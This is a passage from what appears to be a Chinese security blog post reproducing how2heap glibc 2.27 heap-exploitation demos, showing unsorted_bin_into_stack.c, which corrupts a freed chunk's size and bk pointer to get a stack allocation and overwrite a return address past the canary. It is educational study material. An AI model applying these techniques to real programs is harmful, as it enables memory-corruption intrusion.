	p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>stack_var <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23一致</p>
<h3 id="unsorted-bin-into-stack-c"><a href="#unsorted-bin-into-stack-c" class="headerlink" title="unsorted_bin_into_stack.c"></a>unsorted_bin_into_stack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">void</span> <span class="token function">jackpot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nice jump d00d\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span> stack_buffer<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token class-name">intptr_t</span><span class="token operator">*</span> victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">intptr_t</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

	stack_buffer<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x410</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
	stack_buffer<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>stack_buffer<span class="token punctuation">;</span>

	victim<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x30</span><span class="token punctuation">;</span>
	victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>stack_buffer<span class="token punctuation">;</span> <span class="token comment">// victim->bk is pointing to stack</span>

	<span class="token keyword">char</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x410): %p\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">intptr_t</span> sc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">;</span> <span class="token comment">// Emulating our in-memory shellcode</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p2<span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This bypasses stack-smash detection since it jumps over the canary</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23的区别为申请的chunk要增大&#x3D;&#x3D;》绕过tcache</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2022/06/22/How2heap-Glibc2-23/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2022-06-29 09:09:39
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="标签"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
                        #pwn_堆
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2022/07/05/setcontext-ORW/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Glibc2-27"><span class="toc-text">Glibc2.27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-c"><span class="toc-text">fastbin_dup.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-consolidate-c"><span class="toc-text">fastbin_dup_consolidate.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack-c"><span class="toc-text">fastbin_dup_into_stack.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-reverse-into-tcache-c"><span class="toc-text">fastbin_reverse_into_tcache.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-botcake-c"><span class="toc-text">house_of_botcake.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-einherjar-c"><span class="toc-text">house_of_einherjar.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force-c"><span class="toc-text">house_of_force.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-lore-c"><span class="toc-text">house_of_lore.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-mind-fastbin-c"><span class="toc-text">house_of_mind_fastbin.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-spirit-c"><span class="toc-text">house_of_spirit.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-storm-c"><span class="toc-text">house_of_storm.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#large-bin-attack-c"><span class="toc-text">large_bin_attack.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap-overlapping-chunks-c"><span class="toc-text">mmap_overlapping_chunks.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks-c"><span class="toc-text">overlapping_chunks.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poison-null-byte-c"><span class="toc-text">poison_null_byte.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-house-of-spirit-c"><span class="toc-text">tcache_house_of_spirit.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning-c"><span class="toc-text">tcache_poisoning.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-stashing-unlink-attack-c"><span class="toc-text">tcache_stashing_unlink_attack.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsafe-unlink-c"><span class="toc-text">unsafe_unlink.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-c"><span class="toc-text">unsorted_bin_attack.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-into-stack-c"><span class="toc-text">unsorted_bin_into_stack.c</span></a></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2024 Closure</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
        
    </div>
  
  
    <div class="footer-views">
      
          本站总访问量<span id="busuanzi_value_site_pv"></span>次
        
      
      
          本站访客数<span id="busuanzi_value_site_uv"></span>人
        
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + How2heap%20Glibc2.27 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F06%2F29%2FHow2heap-Glibc2-27%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/06/29/How2heap-Glibc2-27/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
